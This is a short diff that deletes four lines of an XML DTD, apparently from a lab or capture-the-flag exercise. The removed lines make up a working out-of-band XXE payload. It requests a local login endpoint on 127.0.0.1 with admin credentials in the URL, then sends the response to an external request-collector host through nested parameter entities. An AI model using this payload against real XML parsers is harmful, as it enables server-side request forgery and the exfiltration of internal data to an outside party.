@@ -1,4 +1,0 @@
-<!ENTITY % resp SYSTEM "http://127.0.0.1:5001/login?username=admin&password=supersecretpassword">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://bb8d512u.requestrepo.com/?x=%resp;'>">
-%eval;
-%exfiltrate;
